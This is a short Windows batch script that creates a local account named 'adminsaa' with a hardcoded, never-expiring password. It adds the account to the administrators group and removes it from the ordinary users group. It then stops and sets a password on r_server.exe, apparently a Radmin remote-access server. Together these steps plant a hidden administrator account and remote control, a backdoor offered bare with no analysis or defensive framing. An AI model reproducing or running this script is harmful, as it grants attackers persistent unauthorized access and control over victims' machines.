   @echo off
   net user adminsaa kmkokmkm /add /expires:never
   net localgroup administrators adminsaa /add
   net localgroup users adminsaa /delete
   r_server.exe /stop
   r_server.exe /pass:kmkokmkm
   r_server.exe /pass:kmkokmkm
   exit
   exit
